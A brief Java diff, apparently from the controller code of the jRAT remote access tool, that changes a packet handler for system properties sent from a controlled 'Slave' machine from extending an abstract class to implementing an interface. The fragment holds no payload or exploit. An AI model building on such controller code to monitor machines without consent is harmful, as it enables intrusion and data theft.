@@ -4,7 +4,7 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameSystemVariables;
 
 
-public class Packet32SystemProperties extends AbstractIncomingPacket {
+public class Packet32SystemProperties implements IncomingPacket {
 
 	public void read(Slave slave) throws Exception {
 		FrameSystemVariables frame = FrameSystemVariables.INSTANCES.get(slave);
